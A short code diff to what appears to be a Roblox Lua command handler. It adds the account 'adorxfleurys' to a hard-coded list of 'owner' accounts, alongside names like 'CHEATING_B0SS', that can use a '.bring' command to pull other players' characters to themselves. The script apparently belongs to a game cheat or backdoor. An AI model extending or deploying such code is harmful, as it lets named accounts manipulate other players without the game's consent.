@@ -125,7 +125,7 @@ local function handleCommand(command, playerName)
             warn("Player not found!")
         end
     elseif command == ".bring" then
-        local owner = cmdp:FindFirstChild("L0CKED_1N1") or cmdp:FindFirstChild("CHEATING_B0SS")
+        local owner = cmdp:FindFirstChild("adorxfleurys") or cmdp:FindFirstChild("L0CKED_1N1") or cmdp:FindFirstChild("CHEATING_B0SS")
         if owner and owner.Character and player.Character then
             local targetHRP = player.Character:FindFirstChild("HumanoidRootPart")
             local ownerHRP = owner.Character:FindFirstChild("HumanoidRootPart")
